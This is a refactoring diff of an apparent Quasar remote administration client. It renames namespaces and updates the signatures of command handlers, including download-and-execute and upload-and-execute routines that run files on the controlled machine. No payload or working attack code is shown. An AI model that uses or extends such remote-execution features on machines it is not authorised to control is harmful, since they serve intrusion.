@@ -4,19 +4,18 @@ using System.IO;
 using System.Net;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Client.Core.Helper;
+using Quasar.Client.Core.Utilities;
 using Quasar.Common.IO;
 using Quasar.Common.Messages;
-using xClient.Core.Helper;
-using xClient.Core.Networking;
-using xClient.Core.Utilities;
 
-namespace xClient.Core.Commands
+namespace Quasar.Client.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
     public static partial class CommandHandler
     {
         public static void HandleDoDownloadAndExecute(DoDownloadAndExecute command,
-            Client client)
+            Networking.Client client)
         {
             client.Send(new SetStatus {Message = "Downloading file..."});
 
@@ -69,7 +68,7 @@ namespace xClient.Core.Commands
             }).Start();
         }
 
-        public static void HandleDoUploadAndExecute(DoUploadAndExecute command, Client client)
+        public static void HandleDoUploadAndExecute(DoUploadAndExecute command, Networking.Client client)
         {
             if (!_renamedFiles.ContainsKey(command.Id))
                 _renamedFiles.Add(command.Id, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));
@@ -116,7 +115,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoVisitWebsite(DoVisitWebsite command, Client client)
+        public static void HandleDoVisitWebsite(DoVisitWebsite command, Networking.Client client)
         {
             string url = command.Url;
 
@@ -151,7 +150,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoShowMessageBox(DoShowMessageBox command, Client client)
+        public static void HandleDoShowMessageBox(DoShowMessageBox command, Networking.Client client)
         {
             new Thread(() =>
             {
